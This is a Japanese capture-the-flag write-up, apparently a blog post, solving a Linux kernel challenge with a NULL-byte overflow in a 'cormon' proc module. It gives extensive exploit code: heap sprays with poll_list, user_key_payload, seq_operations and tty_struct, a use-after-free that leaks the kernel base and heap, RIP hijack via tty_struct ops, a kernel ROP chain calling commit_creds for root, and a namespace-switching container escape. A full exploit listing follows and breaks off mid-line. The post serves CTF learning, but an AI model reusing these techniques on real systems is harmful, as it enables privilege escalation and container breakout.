description, payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA); ... } // security/keys/key.c key_ref_t key_create_or_update(key_ref_t keyring_ref, const char *type, const char *description, const void *payload, size_t plen, key_perm_t perm, unsigned long flags) { struct keyring_index_key index_key = { .description\t= description, }; struct key_preparsed_payload prep; index_key.type = key_type_lookup(type); memset(\u0026prep, 0, sizeof(prep)); ... if (index_key.type-\u003epreparse) { ret = index_key.type-\u003epreparse(\u0026prep); ... } ... ret = __key_instantiate_and_link(key, \u0026prep, keyring, NULL, \u0026edit); ... } はい。manpageによると、keyring, user, logon, bigkeyという4種類の鍵があります。そしてそのそれぞれについてfopsみたいなstruct key_type構造体が結びついています。このハンドラの中の、ユーザ入力ペイロードをパースする関数である.preparseは、userタイプの場合user_preparse()関数に成っています。user_preparse()は、user_key_payload構造体をkmallocします。この構造体はこれまた可変サイズを持ち、最大sizeof(struct user_key_payload) + 32767までの任意のサイズをユーザ指定で確保することができます。解放も、ユーザが任意のタイミングで行うことができます(keyctl_revoke)。読むことも、できます。素晴らしい構造体ですね、全くどうやってこんなもんを見つけてくるのやら。おまけに、特筆すべきこととして最初のメンバであるrcuは初期化されるまではもとの値が保たれるみたいです。ふぅ。\nkbase leak via user_key_payload and seq_operations さて、これらの材料を使うとkernbaseがリークできそうです。細かい事は無視して大枠だけ考えます。 事前準備として、add_keyを呼び出してstruct user_key_payloadをkmalloc-32に置いておきます。続いて、pollを542個(stackに置かれる30個 + kmalloc-4kに置かれる510個 + kmalloc-32に置かれる2個)のfdに対して呼び出します。そうすると、stack --\u003e kmalloc-4k --\u003e kmalloc-32の順にstruct poll_listのリストが繋がれます。続いて、モジュールのプロックファイルに書き込むことでcormon_proc_write()を呼び出してNULL-byte overflowさせます。このときバッファはkmalloc-4kにとられるため、うまく行くと先程のpoll_list.nextポインタの最後1byteがpartial overwriteされます。そして、そのアドレスがうまい具合だと、書き換えたあとのポインタが一番最初に準備したuser_key_payloadを指すことになります。続いてpoll_listをfreeさせる(これはtimer expireでも、イベントを発生させるのでもどちらでもOK)ことで、リストにつながっているuser_key_payloadをfreeします。これでuser_key_payloadのUAF完成です。kbaseを読むためにseq_operationsらへんを確保して、user_key_payloadの上に配置します。あとはkeyctl_readでペイロードを読むことで、kbaseをleakできます。 というようにシナリオだけ文面で考えると簡単そうですが、「うまくいくと」と書いたところをうまくさせないといけませんね。まぁスプレーでなんとかなるでしょう。 さて、順を追ってやっていきましょう。まずはadd_key()でkmalloc-32に鍵を置きます。なお、add_key syscallに対するglibc wrapperはないため、libkeyutils-dev等のパッケージをインストールしたあと、-lkeyutilsを指定してビルドする必要があります。 雑にkeyをスプレーします:\nvoid spray_keys() { char *desc = calloc(0x100, 1); if (desc \u003c= 0) errExit(\"spray_keys malloc\"); strcpy(desc, DESC_KEY_TOBE_OVERWRITTEN_SEQOPS); for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) { memcpy(desc + strlen(DESC_KEY_TOBE_OVERWRITTEN_SEQOPS), \u0026ix, 4); char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); memset(key_payload, 'A', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); key_serial_t keyid0 = add_key(\"user\", desc, key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, KEY_SPEC_PROCESS_KEYRING); if (keyid0 \u003c 0) errExit(\"add_key 0\"); } } すると、以下のようにヒープの中にそれらしい箇所が見つかります(pt -ss AAAAAAAA -align 8 )。きっとコレがkmalloc-32でしょう。needleとして仕込んだAAAAAAAAというペイロードと、その直前がshortの0x08(ushort datalen)であることからもわかります:\nところで、user_key_payloadが連続していないことが見て取れますね。きっと、CONFIG_SLAB_FREELIST_RANDOMIZEらへんが有効化されているのでしょう。 続いて、poll_listをkmalloc-4kとkmalloc-32にスプレーしていきます。\nassign_to_core(0); for (int ix = 0; ix != NUM_POLLLIST_ALLOC; ++ix) { if(pthread_create(\u0026threads[ix], NULL, alloc_poll_list, \u0026just_fd) != 0) errExit(\"pthread_create\"); } 今回はpollするイベントはPOLLERR(=0x0008)で、使ったfdは0x00000004なので、バイト列0x0000000400080000をニードルとして検索できます(pt -sb 08000000040000000800000004000000 -align 16。まぁ、pt -sb fe01000004000000 -align 8のほうが良さそう)。ところで、struct poll_listにおいて、struct pollfd[]って8byteアラインされないんですね。おかげでpoll_listがどこにも見つからない…!と発狂する羽目になりました。あ、ところでこのptコマンドはgdb-pt-dumpのことです。\nさぁさぁ、とりあえずは各構造体が意図したサイズのキャッシュに入っていることが分かりました。 この状態で、一旦NULL-byte overflowさせてみます:\nvoid nullbyte_overflow(void) { assert(cormon_fd \u003e= 2); memset(cormon_buf, 'B', 0x1000 + 0x20); strcpy((char*)cormon_buf + 1, \"THIS_IS_CORMON_BUFFER\"); *cormon_buf = 0x00; if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit(\"nullbyte_overflow\"); errno = 0; } うーん、確かに次のページ上のスラブオブジェクトがNULL-byte overflowされている感じはしますが、このオブジェクトは明らかにstruct poll_listではありません(.lenメンバが不正)。色々と試してみた結果、struct poll_listを確保する回数を0x10 -\u003e 0x10-2回にしたらいい感じになりました。スプレーでは大事、こういう小さい調整:\n確かにcormon_proc_write()で確保されたバッファとstruct poll_listが隣接し、poll_list.nextの先頭1byteがNULL-byte overflowされていることがわかりますね。因みに、writeupによるとsched_setaffinity()を使ってどのコアを使うかをコントロールしたほうがいいらしいです。確かにスラブキャッシュはPERCPUだから、そっちのほうが良さそう。頭いいね！ さぁ、ここで重要なことは、overwriteされたnextポインタが指す先(0xffff888007617500)が最初に確保したuser_key_payloadになっているかどうか。且つ、最初のメンバであるuser_key_payload.rcuがNULLであるかどうかですが…:\n完璧ですね。これであとは数秒待ってpollをタイムアウトさせることで、poll_listが先頭から順にfreeされていきます。user_key_payloadもfreeされてしまいます。よって、こいつの上に新しく何らかの構造体を置いてあげましょう。kmalloc-32に入っていて、且つkptrを含んでいるものなら何でもいいです。今回はseq_operationsを使ってみます:\n// Check all keys to leak kbase via `seq_operations` char keybuf[0x100] = {0}; ulong leaked = 0; for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) { memset(keybuf, 0, 0x100); if(keyctl_read(keys[ix], keybuf, 0x100) \u003c 0) errExit(\"keyctl_read\"); if (strncmp(keybuf, \"AAAA\", 4) != 0) { leaked = *(ulong*)keybuf; } } if (leaked == 0) { puts(\"[-] Failed to leak kbase\"); exit(1); } printf(\"[!] leaked: 0x%lx\\n\", leaked); う〜〜〜ん、panicしているので確実に悪いことはできているのですが上手くleakはできていません。gdbで見てみましょう:\n前半がoverflowされたpoll_list、後半がpoll_list.nextに指されたためにfreeされてuser_key_payloadからseq_operationsになったもの。う〜ん、一見すると良さそうですけどね。とりあえず一番最初にもっとkmalloc-32を飽和させておいたほうがいいんじゃないかと思い、user_key_payloadをもっとスプレーしようとしたところ、以下のエラーになりました:\n詳しくは見ていないけど、鍵はあんまり多くは確保できなさそうなので代わりにseq_operationsでもっとスプレーしておくようにしました。それから、pthread_join()する度にすぐさまseq_operationsを確保するようにしました。しかしながら、やっぱりkeyctl_read()でleakできない！！\nしばらく悩んだあとkeyctl_readのmanpageを呼んでみると以下の記述が:\nRETURN VALUE On success keyctl_read() returns the amount of data placed into the buffer. If the buffer was too small, then the size of buffer required will be returned, and the contents of the buffer may have been overwritten in some undefined way. あ、バッファサイズが小さい場合には、undefinedな動作が起こるらしい…。ということで、keyctl_read()に渡すバッファサイズを十分大きく(\u003e=0x4330)してもう一度やってみると:\nよさそう！\nleak kheap via tty_struct / tty_file_private kbase leakができました。さて、どうしよう。一瞬このままuser_key_payloadであり且つseq_operationsでもあるオブジェクトをuser_key_payloadとしてkfreeし、setxattrを使ってseq_operations内のポインタを書き換えてやればRIPが取れるじゃんと思いましたが、KPTIがある都合上stack pivotする必要があり、heapのアドレスが必要であることに気が付きました。 とりあえずはheapのアドレスが欲しい。幸いにも、kbaseのleakに使ったuser_key_payloadだったオブジェクトは、上に乗っているseq_operationsを解放して他のオブジェクトにしてやることで再度leakをすることができます。というわけで、tty_structを使いましょう。/dev/ptmxを開くと以下のパスに到達します:\nstruct tty_file_private { struct tty_struct *tty; struct file *file; struct list_head list; }; static int ptmx_open(struct inode *inode, struct file *filp) { struct tty_struct *tty; int retval; ... retval = tty_alloc_file(filp); ... tty = tty_init_dev(ptm_driver, index); ... tty_add_file(tty, filp); ... } int tty_alloc_file(struct file *file) { struct tty_file_private *priv; priv = kmalloc(sizeof(*priv), GFP_KERNEL); file-\u003eprivate_data = priv; return 0; } void tty_add_file(struct tty_struct *tty, struct file *file) { struct tty_file_private *priv = file-\u003eprivate_data; priv-\u003etty = tty; priv-\u003efile = file; ... } ここで、tty_alloc_file()は/dev/ptmxのstruct fileのprivate_dataメンバに対してstruct tty_file_privateを確保して入れます。これはkmalloc-32から確保されます。その後、tty_init_dev()でstruct tty_structをkmalloc-1024から確保します。そして、tty_add_file()でstruct tty_file_private内にstruct tty_structのアドレスを格納します。つまり、kmalloc-32内のtty_file_privateをleakすることでkmalloc-1024のアドレスをleakすることができます。\n// Free all keys except UAFed key for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) { if (keys[ix] != uafed_key) { if (keyctl_revoke(keys[ix]) != 0) errExit(\"keyctl_revoke\"); if (keyctl_unlink(keys[ix], KEY_SPEC_PROCESS_KEYRING) != 0) errExit(\"keyctl_unlink\"); } } // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32 for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) { if (open(\"/dev/ptmx\", O_RDWR) \u003c= 2) errExit(\"open tty\"); } // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024 memset(keybuf, 0, 0x5000); if(keyctl_read(uafed_key, keybuf, 0x5000) \u003c= 0) errExit(\"keyctl_read\"); ulong km1024_leaked = 0; ulong *tmp = (ulong*)keybuf + 1; for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) { if ((tmp[ix] \u003e\u003e (64-4*4)) == 0xFFFF \u0026\u0026 tmp[ix+2] == tmp[ix+3] \u0026\u0026 tmp[ix+2] != 0 \u0026\u0026 (tmp[ix] \u0026 0xFF) == 0x00) { // list_head's next and prev are same km1024_leaked = tmp[ix]; printf(\"[!] \\t+0: 0x%lx (tty)\\n\", tmp[ix]); printf(\"[!] \\t+1: 0x%lx (*file)\\n\", tmp[ix + 1]); printf(\"[!] \\t+2: 0x%lx (list_head.next)\\n\", tmp[ix + 2]); printf(\"[!] \\t+3: 0x%lx (list_head.prev)\\n\", tmp[ix + 3]); break; } } if (km1024_leaked == 0) errExit(\"Failed to leak kmalloc-1024\"); printf(\"[!] leaked kmalloc-1024: 0x%lx\\n\", km1024_leaked); 良さそう！と思いきや、実際に表示されたttyのアドレスを見てみると、先頭がマジックナンバー(0x5401)ではなかったため違うポインタでした。何度試してみても、ttyと思わしきものは50回に1回程度しかleakできない…。うーん、何が悪いのか。UAFされたuser_key_payload以外のkeyをfreeして代わりにtty_file_privateを置いたあとのuser_key_payloadが以下の感じ:\n先頭32byteがuser_key_payloadで、上にはkbaseのleakに使ったseq_operationsが乗っかっています。leakできるのはuser_key_payloadよりも下の0x4330byte程度(これは、seq_operationsをUAFで乗せた際に、user_key_payload.datalenがsingle_nextのアドレスの下2byteである4330で上書きされるため)であるため見てみると、seq_operationsの名残がいくつか見えますね。0xa748dc1b1f063d98は、おそらくフリーなスラブオブジェクト内のリストポインタが暗号化(CONFIG_SLAB_FREELIST_HARDENED)されているやつでしょう。このことから考えられることとしては、keyのスプレーが少なくてキャッシュ内がkeyで満たされる前に同じ領域にseq_operationsが入ってきてしまったことが考えられます。よって、スプレーするkeyを増やしてみたところ以下の感じ:\n偶然のような気もしますが、ランダムなQWORD(つまり、暗号化されたスラブのポインタ)と0x41414141(keyのペイロードとして入れた値)が同一オブジェクト内に入っているため、keyとして割り当てられていたオブジェクトがフリーされていることが分かります。しかし、フリーされたままということはtty_file_privateをスプレーする数が少なかったということでしょうか。少し増やしてみましたが、やはりできません。悲しい。 ここで自分のコードを見てみると…:\n#define NUM_KEY_SPRAY 80 + 10 #define NUM_POLLFD 30 + 510 + 1 // stack, kmalloc-4k, kmalloc-32 #define NUM_POLLLIST_ALLOC 0x10 - 0x1 key_serial_t keys[NUM_KEY_SPRAY * 5] = {0}; for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {...} for (int ix = 0; ix != NUM_KEY_SPRAY * 9; ++ix) {...} 馬鹿！！大馬鹿！おまわりさん、馬鹿はこいつです！捕まえちゃってください！ マクロなんて所詮文字列置換なので、NUM_KEY_SPRAY * 2は80 + 10 * 2と評価されてしまいます！どうりで思った動きしないわけだよ！ というわけで、上のバグを直して十分なtty_file_privateを確保してみた上で、一旦kbaseをリークした直後(keyは全て解放前。UAFされたkeyの上にはseq_operationsが乗っている)のヒープを見てみるとこんな感じ:\n一番上がUAFされたkeyで、その直後にはたくさんのkeyが存在していることが分かります(paylod=AAAAA)。理想的な状況ですね。これでも上手くいかないのはなぜ…。ここでkey周りのソースを見返してみます:\n/* * Clean up a keyring when it is destroyed. Unpublish its name if it had one * and dispose of its data. * * The garbage collector detects the final key_put(), removes the keyring from * the serial number tree and then does RCU synchronisation before coming here, * so we shouldn't need to worry about code poking around here with the RCU * readlock held by this time. */ static void keyring_destroy(struct key *keyring) {...} あ、unlink後にGC(security/keys/gc.c)がfreeするのか…! ということは、tty_file_privateをスプレーする前に1秒ほどsleepしてGCを待ってやるといいのではと思いやってみると:\nよさそう〜〜〜！\nget RIP by overwriting tty_struct.ops さて、続いてRIPをとりましょう。や、取らなくても年は越せるんですが。 現状ですが、kmalloc-32にUAFされたuser_key_payload(+上に乗っかっているtty_file_private)があります。このUAFを再利用して、今度はUAF writeをしましょう。具体的には、poll_listがkmalloc-1024 -\u003e kmalloc-32のリストになっている時、kmalloc-32をUAFで上書きし、poll_list.nextポインタにtty_struct(kmalloc-1024)のアドレスを書き込んでやります。その状態でpoll_listをfreeすることで関係ないtty_structをfreeしてやることができます。tty_structをUAFできたら、あとはopsを書き換えてやればいいはず…多分…! というわけで、それらをしてくれるコードがこれです(3分クッキング感):\n// Free `seq_operations`, one of which is `user_key_payload` for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) { close(seqops_fd[ix]); } puts(\"[+] Freeed seq_operations\"); // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload` assign_to_core(2); neverend = 1; puts(\"[+] spraying `poll_list` in kmalloc-32...\"); num_threads = 0; for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) { struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t)); arg-\u003efd = just_fd; arg-\u003eid = ix; arg-\u003etimeout_ms = 3000; // must 1000 \u003c timeout_ms, to wait key GC arg-\u003enum_size = 30 + 2; if(pthread_create(\u0026threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(\"pthread_create\"); } // Revoke UAFed key, which is on `poll_list` in kmalloc-32 puts(\"[+] Freeing UAFed key...\"); free_key(uafed_key); sleep(1); // Spray keys on UAFed `poll_list` puts(\"[+] spraying keys in kmalloc-32\"); assert(num_keys == 0); { char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); _alloc_key_prefill_ulong_val = 0xDEADBEEF; for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) { alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong); } } user_key_payloadを確保する前に予めsetxattr()で0xDEADBEEFを書き込んでいます。これによって、user_key_payload.rcuがこの値になり、且つpoll_list.nextがこの値になるはず。実行してみると…:\n??? Kernel memory overwrite attempt detected to SLUB object 'filp'らしいです。ソースを読んでみると、これはCONFIG_HARDENED_USERCOPYが有効な場合に表示される文面みたいですね。\nvoid __noreturn usercopy_abort(const char *name, const char *detail, bool to_user, unsigned long offset, unsigned long len) { pr_emerg(\"Kernel memory %s attempt detected %s %s%s%s%s (offset %lu, size %lu)!\\n\", to_user ? \"exposure\" : \"overwrite\", to_user ? \"from\" : \"to\", name ? : \"unknown?!\", detail ? \" '\" : \"\", detail ? : \"\", detail ? \"'\" : \"\", offset, len); BUG(); } void __check_heap_object(const void *ptr, unsigned long n, struct page *page, bool to_user) { ... usercopy_abort(\"SLUB object\", s-\u003ename, to_user, offset, n); } 何回かやってみると、keyのスプレーの際にfilpとかworker_poolとかいうkmalloc-256サイズのキャッシュへのoverwriteが検知されて落ちているみたいです。おそらくですが、poll_listをスプレーするスレッドを立ち上げてからすぐにuser_key_payloadをfreeさせるようにしていたため、UAFしているオブジェクトにpoll_listが確保される前にuser_key_payloadがfreeされてしまい、seq_operationsのfreeと相まってdouble freeになってヒープが崩壊してしまったせいなんじゃないかと思います。そこで、スレッドを立ち上げた後に少しだけsleepしてみると、とりあえずこのエラーは出なくなりました。必要なguessingは、必要です。\ndead beef、良さそう！続いて、deadbeefをちゃんと先程leakしたtty_structのアドレスにしてUAFし、その後で0x1000サイズのuser_key_payloadをスプレーすることで全て0x5401(tty_structのmagic number)で埋めてみると:\nうんうん、良さそう。tty_struct.opsも一緒に0x5401に書き換えたので、ちゃんと落ちてくれてますね！RIPが取れました。\nget root by kROP on tty_struct itself TTYへのioctl()によって、ジャンプ直後のレジスタの値は以下のようになります:\nRBX, RCX, RSIは第2引数で4byte、RDX, R8, R12は第3引数で8byteだけ任意に指定できます。RDIとRBPとR14はtty_struct自身を指します。stack pivotをするために、push RXX, JMP RYY, POP RSPのようなことをしたいのですが、RSI達は4byteしか指定できないため使うことはできません。 さて、みなさんも覚えておきましょう、tty_structはまじでROPしやすいです:\nchar *key_payload = malloc(0x1000); ulong *buf = (ulong*)key_payload; buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP) buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`) buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed) buf[3] = km1024_leaked + 0x50; // ops ulong *ops = (ulong*)(key_payload + 0x50); for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations ops[ix] = KADDR(0xffffffff81577609); // pop rsp } ulong *rop = (ulong*)((char*)ops + 0x120); *rop++ = ... assert((ulong)rop - (ulong)key_payload \u003c 516); まず、opsを書き換えてtty_struct + 0x50を指すようにします。この領域に偽のvtableとしてleaveするガジェットのアドレスを入れておきます。すると、上で書いたようにRBPにはtty_struct自身のアドレスが入っているため、leaveするとtty_structのアドレスがRSPに入ります。この状態でRETすると、tty_struct + 8に入っているアドレスに戻ることになります。ここはtty_struct.devポインタであり、壊れてても良い値なので、ここにtty_struct + 0x50 + 0x120のアドレスを入れておきます。あとは、+0x50 + 0x120の領域に好きなROPを組んでおくだけです。本当に、ROPのためにある構造体と言っても過言ではありません。偶然magic numberもvalidでなくてはいけないポインタ(+0x10: driver)を壊すことなくいけます。奇跡の構造体です。 ROP自体はこんな感じ:\n*rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = 0; *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`) *rop ++ = 0; *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found) *rop++ = KADDR(0xffffffff810eba40); // commit_creds *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16 // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ... *rop++ = 0; *rop++ = 0; *rop++ = (ulong)NIRUGIRI; *rop++ = user_cs; *rop++ = user_rflags; *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2; *rop++ = user_ss; ルート！\ncontainer escape しかし、この問題はこれで終わりではありません。コンテナの中なので、コンテナエスケープする必要があります。個々から先の知識は全くありません、またもやカンニングしましょう。こっから先は写経です。意味のある写経です。カス写経です。 といっても、RIPとれてればそんなに難しいことではないみたい。docker内ではsetns() syscallは禁止されてるから、今回はfilesystem namespaceだけ移動させます。以下の感じ:\n// ROOTをとるには...? commit_cred(prepare_kernel_cred(0)); // docker escape(fs)するには...? switch_task_namespaces(find_task_vpid(1), init_nsproxy); current-\u003efs = copy_fs_struct(init_fs); これだけ！やった〜〜〜〜。\n*rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = 1; // init process in docker container *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`) *rop ++ = 0; *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found) *rop++ = KADDR(0xffffffff819b21d3); // pop rsi *rop++ = KADDR(0xffffffff8245a720); // \u0026init_nsproxy *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces *rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = KADDR(0xffffffff82589740); // \u0026init_fs *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx *rop++ = KADDR(0xffffffff81906510); // pop rdi *rop++ = getpid(); *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid *rop++ = KADDR(0xffffffff8117668f); // pop rdx *rop++ = 0x6E0; *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found) *rop++ = 0; // trash アウトロ うおうおふぃっしゅらいふ。\nFull Exploit #include \"./exploit.h\" #include \u003cbits/pthreadtypes.h\u003e #include \u003ckeyutils.h\u003e #include \u003cpthread.h\u003e #include \u003csys/mman.h\u003e #include \u003cunistd.h\u003e /*********** commands ******************/ #define DEV_PATH \"/proc_rw/cormon\" // the path the device is placed /*********** constants ******************/ #define DESC_KEY_TOBE_OVERWRITTEN_SEQOPS \"exploit0\" #define SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS 0x8 #define NUM_KEY_SPRAY (0x60) #define NUM_2ND_KEY_SPRAY (NUM_KEY_SPRAY * 2) #define NUM_3RD_KEY_SPRAY (0x10 + 0x8) #define NUM_3RD_KEY_SIZE (0x290) #define NUM_PREPARE_KM32_SPRAY 2000 #define NUM_POLLFD (30 + 510 + 1) // stack, kmalloc-4k, kmalloc-32 #define NUM_1ST_POLLLIST_ALLOC (0x10 - 0x1 + 0x1) #define NUM_2ND_POLLLIST_ALLOC (0x120 + 0x20 + 0x40 + 0x40 + 0x40 + 0x200) #define TIMEOUT_POLLFD 2000 // 2s #define NUM_TTY_SPRAY (0x100) #define NUM_SEQOPERATIONS (NUM_1ST_POLLLIST_ALLOC + 0x100) #define NUM_FREE_SEQOPERATIONS (0x160) #define KADDR(addr) ((ulong)addr - 0xffffffff81000000 + kbase) /*********** globals ******************/ int cormon_fd; int just_fd; key_serial_t keys[NUM_KEY_SPRAY * 5] = {0}; int seqops_fd[0x500]; int tty_fd[NUM_TTY_SPRAY * 2]; char *cormon_buf[0x1000 + 0x20] = {0}; pthread_t threads[0x1000]; int num_threads = 0; pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; ulong kbase = 0; int neverend = 0; char *krop_stack = NULL; #define KROP_USTACK_SIZE 0x10000 /*********** utils ******************/ int num_keys = 0; ulong _alloc_key_prefill_ulong_val = 0; void _alloc_key_prefill_ulong() { static char *data = NULL; if (data == NULL) data = calloc(0x1000, 1); //for (int ix = 0; ix != 32 / 8; ++ix) ((ulong*)data)[ix] = _alloc_key_prefill_ulong_val; ((ulong*)data)[0] = _alloc_key_prefill_ulong_val; setxattr(\"/home/user/.bashrc\", \"user.x\", data, 32, XATTR_CREATE); } void _alloc_key_prefill_null(void) { _alloc_key_prefill_ulong_val = 0; _alloc_key_prefill_ulong(); } void alloc_key(char *payload, int size, void (*prefill)(void)) { static char *desc = NULL; if (desc == NULL) desc = calloc(1, 0x1000); sprintf(desc, \"key_%d\", num_keys); if (prefill != NULL) prefill(); keys[num_keys] = add_key(\"user\", desc, payload, size, KEY_SPEC_PROCESS_KEYRING); if (keys[num_keys] \u003c 0) errExit(\"alloc_key\"); num_keys++; } void spray_keys(int num, char c) { static char *payload = NULL; if (payload == NULL) payload = calloc(1, 0x1000); char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); memset(key_payload, c, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS); for (int ix = 0; ix != num; ++ix) alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_null); } void free_key(key_serial_t key) { if (keyctl_revoke(key) != 0) errExit(\"keyctl_revoke\"); if (keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING) != 0) errExit(\"keyctl_unlink\"); --num_keys; } struct alloc_poll_list_t { int fd; int id; int num_size; int timeout_ms; }; void* alloc_poll_list(void *_arg) { struct pollfd fds[NUM_POLLFD]; struct alloc_poll_list_t *arg = (struct alloc_poll_list_t *)_arg; assert(arg-\u003efd \u003e= 2); for (int ix = 0; ix != arg-\u003enum_size; ++ix) { fds[ix].fd = arg-\u003efd; fds[ix].events = POLLERR; } pthread_mutex_lock(\u0026mutex); ++num_threads; pthread_mutex_unlock(\u0026mutex); thread_assign_to_core(0); if (poll(fds, arg-\u003enum_size, arg-\u003etimeout_ms) != 0) errExit(\"poll\"); pthread_mutex_lock(\u0026mutex); --num_threads; pthread_mutex_unlock(\u0026mutex); if (neverend) { thread_assign_to_core(2); while(neverend); } return NULL; } void nullbyte_overflow(void) { assert(cormon_fd \u003e= 2); memset(cormon_buf, 'B', 0x1000 + 0x20); strcpy((char*)cormon_buf + 1, \"THIS_IS_CORMON_BUFFER\"); *cormon_buf = 0x00; if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit(\"nullbyte_overflow\"); errno = 0; // `write()` above must fail, so clear errno here } /*********** main ******************/ int main(int argc, char *argv[]) { char *keybuf = malloc(0x5000); // must be \u003e= 0x4330 (low 2byte of single_next()) puts(\"[.] Starting exploit.\"); puts(\"[+] preparing stack for later kROP...\"); save_state(); krop_stack = mmap((void*)0x10000000, KROP_USTACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); if (krop_stack == MAP_FAILED) errExit(\"mmap\"); assign_to_core(0); if ((cormon_fd = open(DEV_PATH, O_RDWR)) \u003c= 2) errExit(\"open cormon\"); // Pre-spray kmalloc-32 puts(\"[+] pre-spraying kmalloc-32...\"); for (int ix = 0; ix != NUM_PREPARE_KM32_SPRAY; ++ix) { if (open(\"/proc/self/stat\", O_RDONLY) \u003c= 2) errExit(\"prespray\"); } // Spray victim `user_key_payload` in kmalloc-32 puts(\"[+] Spraying keys...\"); spray_keys(NUM_KEY_SPRAY, 'A'); // Spray poll_list in kmalloc-32 and kmalloc-4k just_fd = open(\"/etc/hosts\", O_RDONLY); printf(\"[+] Spraying poll_list (fd=%d)...\\n\", just_fd); if (just_fd \u003c= 2) errExit(\"just_fd\"); assign_to_core(1); num_threads = 0; for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC + 3; ++ix) { struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t)); arg-\u003efd = just_fd; arg-\u003eid = ix; arg-\u003etimeout_ms = ix \u003c NUM_1ST_POLLLIST_ALLOC ? TIMEOUT_POLLFD : 1;; arg-\u003enum_size = NUM_POLLFD; if(pthread_create(\u0026threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(\"pthread_create\"); } // Wait some of `poll_list` in kmalloc-4k is freed (these are expected to be reused by cormon_proc_write()) assign_to_core(0); usleep(500 * 1000); // wait threads are initialized for(int ix = NUM_1ST_POLLLIST_ALLOC; ix \u003c NUM_1ST_POLLLIST_ALLOC + 3; ++ix) { pthread_join(threads[ix], NULL); } // Spray again victim `user_key_payload` in kmalloc-32 spray_keys(NUM_KEY_SPRAY, 'A'); // NULL-byte overflow (hopelly) on `poll_list`, whose `next` pointer get pointing to `user_key_payload` in kmalloc-32. puts(\"[+] NULL-byte overflow ing...\"); nullbyte_overflow(); // Wait all `poll_list` are freed for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC; ++ix) { open(\"/proc/self/stat\", O_RDONLY); pthread_join(threads[ix], NULL); } puts(\"[+] Freed all 'poll_list'\"); // Place `seq_operations` on UAFed `user_key_payload` in kmalloc-32 for(int ix = 0; ix != NUM_SEQOPERATIONS; ++ix) { if ((seqops_fd[ix] = open(\"/proc/self/stat\", O_RDONLY)) \u003c= 2) errExit(\"open seqops\"); } // Check all keys to leak kbase via `seq_operations` ulong single_show = 0; key_serial_t uafed_key = 0; for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) { int num_read; memset(keybuf, 0, 0x5000); if((num_read = keyctl_read(keys[ix], keybuf, 0x5000)) \u003c= 0) errExit(\"keyctl_read\"); if (strncmp(keybuf, \"AAAA\", 4) != 0) { single_show = *(ulong*)keybuf; uafed_key = keys[ix]; if (single_show == 0) { puts(\"[-] somehow, empty key found\"); } else break; } } if (single_show == 0) { puts(\"[-] Failed to leak kbase\"); exit(1); } printf(\"[!] leaked single_show: 0x%lx\\n\", single_show); kbase = single_show - (0xffffffff813275c0 - 0xffffffff81000000); printf(\"[!] leaked kbase: 0x%lx\\n\", 